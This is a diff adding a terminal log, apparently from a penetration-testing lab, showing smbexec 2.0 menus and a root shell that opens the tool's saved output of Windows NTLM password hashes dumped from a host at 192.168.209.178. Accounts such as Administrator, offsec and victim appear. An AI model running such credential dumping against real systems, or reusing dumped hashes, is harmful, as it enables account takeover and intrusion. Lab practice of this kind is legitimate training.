@@ -1,0 +1,61 @@
+**********************************************************************
+*                    smbexec 2.0 - Machiavellian                     *
+**********************************************************************
+
+                            Hash Dump Menu                            
+
+1. Domain Controller                                   192.168.209.178
+2. Workstation & Server Hashes                           CLIENT\offsec
+3. Main menu                                                 Pass: xxx
+                                                      Remote logins: 1
+
+Choice : 3
+
+**********************************************************************
+*                    smbexec 2.0 - Machiavellian                     *
+**********************************************************************
+
+                              Main Menu                               
+
+1. System Enumeration                                  192.168.209.178
+2. System Exploitation                                   CLIENT\offsec
+3. Obtain Hashes                                             Pass: xxx
+4. Options                                            Remote logins: 1
+5. Exit                                   
+
+Choice : 5
+
+[*] Cleaning up...
+[*] Saving state to ./log/smbexec-2018-4-30/state/smbexec_state_0-8.yml...
+root@alice:/opt/smbexec# ls
+Gemfile       TODO             about.txt   lib      powershell  smbexec.yml
+Gemfile.lock  WCE-LICENSE.txt  certs       log      progs       sources
+README        WCE-README       install.sh  patches  smbexec.rb
+root@alice:/opt/smbexec# cd logo
+bash: cd: logo: No such file or directory
+root@alice:/opt/smbexec# cd log
+root@alice:/opt/smbexec/log# ls
+smbexec-2018-4-30
+root@alice:/opt/smbexec/log# cd smbexec-2018-4-30/
+root@alice:/opt/smbexec/log/smbexec-2018-4-30# ls
+debug  hashes  state
+root@alice:/opt/smbexec/log/smbexec-2018-4-30# cd hashes
+root@alice:/opt/smbexec/log/smbexec-2018-4-30/hashes# ls
+192.168.209.178         cached_hashes_unique.txt  memory_hashes_unique.txt
+all_hashes_by_host.txt  local_hashes_unique.txt
+root@alice:/opt/smbexec/log/smbexec-2018-4-30/hashes# cat all_hashes_by_host.txt 
+********************************192.168.209.178********************************
+*	local:
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+offsec:1001:aad3b435b51404eeaad3b435b51404ee:2892d26cdf84d7a70e2eb3b9f05c425e:::
+HomeGroupUser$:1002:aad3b435b51404eeaad3b435b51404ee:37eb6b58fd3ec9fab4300bd9ec52a9a6:::
+victim:1003:aad3b435b51404eeaad3b435b51404ee:2892d26cdf84d7a70e2eb3b9f05c425e:::
+username:1004:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c:::
+lowpriv:1005:aad3b435b51404eeaad3b435b51404ee:f671043ba08e88500d2eb5279ac65e53:::
+*	cache:
+*	memory:
+lowpriv\client:xxx
+offsec\client:xxx
+CLIENT$\WORKGROUP:
+root@alice:/opt/smbexec/log/smbexec-2018-4-30/hashes# 
